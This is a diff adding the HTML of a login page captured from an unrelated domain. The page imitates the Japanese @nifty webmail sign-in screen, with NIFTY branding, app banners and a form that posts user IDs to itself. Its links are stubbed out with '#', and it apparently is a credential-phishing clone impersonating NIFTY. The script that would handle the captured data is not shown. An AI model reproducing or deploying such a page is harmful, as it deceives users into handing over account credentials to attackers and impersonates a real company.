@@ -1,0 +1,227 @@
+<!-- url: https://trampolineparkzone.com/wps/login.php
+status: 200 -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="ja" xml:lang="ja">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=Shift_JIS">
+  <meta http-equiv="Content-Script-Type" content="text/javascript">
+  <meta http-equiv="content-Style-Type" content="text/css">
+
+  <title>@niftyログイン : Webメール</title>
+
+  <meta name="description" content="">
+  <meta name="keywords" content="">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no, maximum-scale=1, user-scalable=no">
+  <meta name="format-detection" content="telephone=no">
+  <link href="Assets/style.css" rel="stylesheet" type="text/css">
+  <link rel="icon" href="Assets/favicon.ico" id="favicon">
+  
+
+
+<meta name="apple-itunes-app" content="app-id=1594525341">
+<meta name="google-play-app" content="app-id=com.nifty.nifapp.android">
+
+<!-- Start SmartBanner configuration -->
+<meta name="smartbanner:title" content="マイ ニフティ">
+<meta name="smartbanner:author" content="NIFTY Corporation">
+<meta name="smartbanner:price" content="無料">
+<meta name="smartbanner:price-suffix-apple" content=" - App Storeで入手">
+<meta name="smartbanner:price-suffix-google" content=" - Google Playで入手">
+<meta name="smartbanner:icon-apple" content="Assets/mynifty.png">
+<meta name="smartbanner:icon-google" content="Assets/mynifty.png">
+<meta name="smartbanner:button" content="開く">
+<meta name="smartbanner:enabled-platforms" content="android">
+<meta name="smartbanner:close-label" content="閉じる">
+<!-- End SmartBanner configuration -->
+
+<link rel="stylesheet" href="Assets/smartbanner.min.css">
+<script src="Assets/smartbanner.min.js"></script>
+
+</head>
+
+<body id="loginPage" style="">
+
+  <div id="wrapper">
+    <!-- #header -->
+    <div id="header">
+      <div class="inner">
+        <div class="logo grid is-between is-middle">
+          
+          
+<div>
+  <a href="#"><img src="Assets/mail.png" alt="@niftyメール" width="auto" height="30"></a>
+</div>
+          
+        </div>
+      </div>
+    </div>
+    <!-- /#header -->
+
+    <!-- #announce -->
+    
+
+    <!-- /#announce -->
+
+    <!-- #container -->
+    
+<div id="container">
+  <div id="contents">
+    <div class="contentsInner">
+      <noscript>
+        <div class="noscript">
+          <p>ご利用中のブラウザーでは、JavaScriptが無効になっています。<br />
+            ログインする際はブラウザー設定でJavaScriptを有効にしてください。</p>
+        </div>
+      </noscript>
+      <!-- login-area -->
+      <div class="login-area sec-area">
+        <div class="inner">
+          <div class="grid">
+            <div class="login-box">
+              <h1 id="login-title">ログイン</h1>
+              <h1 id="login-title-pw" style="display:none">パスワードの入力</h1>
+              <h1 id="login-title-otp" style="display:none">認証コードの入力</h1>
+              <!-- otp_type -->
+              
+              <form action="" method="POST" name="login" onsubmit="return ( check() &amp;&amp; prohibitionDoubleClick() )">
+                <input type="hidden" name="csrfmiddlewaretoken" value="JHrDdD1txfsoAWWZLrXvm9dHtZElgOiYAlHLJdHoFSghDGJjWL7hBeafoKGQpeDK">
+                <div id="id-inputArea" class="inputArea">
+                  <div id="alrt-msg" class="code-text">
+                    <p>ご登録メールアドレスに届いた</p>
+                    <p>認証コードを入力してください</p>
+                  </div>
+                  <div id="alrt-msg-sms" class="code-text">
+                    <p>ご登録電話番号に届いた</p>
+                    <p>認証コードを入力してください</p>
+                  </div>
+                  <p id="id-area" class="id-text">
+                    <label>
+                      <input type="text" name="user_id" placeholder="@nifty ID または @niftyユーザー名" autofocus="autofocus" class="login-input" autocomplete="username" maxlength="50" id="id_user_id" required >
+                    </label>
+                  </p><p id="id_empty_error" style="display:none" class="error-text">入力してください。</p>
+                  <p id="id_zenkaku_error" style="display:none" class="error-text">半角文字で入力してください。</p>
+                  
+                  <p></p>
+				  
+<!-- 				  
+				  
+                  <p id="pw-area" class="pass-text" hidden="">
+				  
+                    <label>
+				  
+                      <input type="password" name="pw" placeholder="パスワード" placeholder-otp="認証コード" class="login-input input softkeyInput ime-off" data-label="パスワード" autocomplete="current-password" maxlength="30" id="id_pw" style="display: none;">
+				  
+                    </label>
+				  
+                  </p>
+				  
+					   -->
+					  
+					  <div id="password-display" style="display:none">
+                        <label for="password-check">
+                          <input type="checkbox" id="password-check">パスワードを表示する
+                        </label>
+                      </div>
+                    
+                  <p id="pw_empty_error" style="display:none" class="error-text">入力してください。</p>
+                  
+                  <p id="error-message-not-send-sms" class="error-text" hidden="">
+                    認証コードの送信に失敗しました。しばらく時間をおいてから再試行してください。
+                  </p>
+                  
+                  <a id="id-relogin-link" class="relogin-link" href="#" style="display: none;">別の@nifty ID または @niftyユーザー名でログイン</a>
+                  <p></p>
+                  <p class="text">
+                    <label for="id_remember_me"><input type="checkbox" name="remember_me" class="check" checked="checked" id="id_remember_me"> ログインしたままにする（共用のパソコンではチェックを外してください）。</label>
+                  </p>
+                </div>
+                <div class="btnArea">
+                  <p id="submit-btn" class="button">
+                    <button type="submit" id="next" class="btnLogin" name="submit" >パスワード入力へ</button>
+<!--	<button type="submit" id="login" class="btnLogin">ログイン</button>		-->
+                  </p>
+                  <p class="al-c">
+                    <a id="login_help_link_id" href="#">
+                      ≫ @nifty ID または @nifty ユーザー名がわからない場合
+                    </a>
+                    <a id="login_help_link_pw" style="display:none" href="#">
+                      ≫ パスワード がわからない場合
+                    </a>
+                    <a id="login_help_link_otp" style="display:none" href="#">
+                      ≫ ログインできない場合
+                    </a>
+                  </p>
+                </div>
+              </form>
+            </div>
+
+            <!-- other mail services -->
+            <div class="mail-info-area">
+              <h2>@niftyメールの他サービスはこちら</h2>
+              <ul>
+                <li>
+                  <a href="#" rel="noopener">セカンドメール</a>
+                </li>
+                <br>
+                <li>
+                  <a href="#" rel="noopener">セカンドメールPRO</a>
+                </li>
+              </ul>
+            </div>
+
+          </div>
+        </div>
+      </div>
+
+      <!-- info-area -->
+      
+      <div class="info-area sec-area">
+        <div class="inner">
+          <div class="info-box is-mail">
+            <div class="content">
+              <p class="ttl">メールやブログをご利用になる方</p>
+              <p>250円/月(税込275円/月)で安心安全なメールやブログをご利用いただけるコースです。</p>
+              <div class="btn-wrap"><a class="btn is-round is-border" href="#">@nifty基本料金コースに申し込む</a></div>
+            </div>
+          </div>
+        </div>
+      </div>
+      
+    </div>
+  </div>
+</div>
+<link rel="stylesheet" href="Assets/mailer_style.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/es6-promise/3.3.1/es6-promise.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fetch/2.0.4/fetch.min.js"></script>
+<script type="text/javascript" src="Assets/login.js"></script>
+
+    <!-- /#container -->
+
+    <!-- #footer -->
+    <div id="footer">
+      <div class="pkg">
+        <div class="inner grid is-between">
+          <p class="icon"> <a href="#"><img src="Assets/btn-niftop.svg" alt="アット・ニフティトップページへ" name="gotop_img" width="88" height="17" border="0" id="gotop_img" style="vertical-align:middle;"></a></p>
+          <address class="text">
+            <a href="#" rel="nofollow">ウェブサイト利用ガイドライン</a>
+            <span> | </span>
+            <a href="#" rel="nofollow">個人情報保護ポリシー</a>
+            <span> | </span>
+            <a href="#" rel="nofollow">推奨環境</a>
+            <br>
+            cNIFTY Corporation
+          </address>
+        </div>
+      </div>
+    </div>
+    <!-- /#footer -->
+  </div>
+  <!-- /#wrapper -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
+  <script type="text/javascript" src="Assets/index.js"></script>
+  <script type="text/javascript" src="Assets/modaal.min.js"></script>
+
+
+
+</body>
+</html>
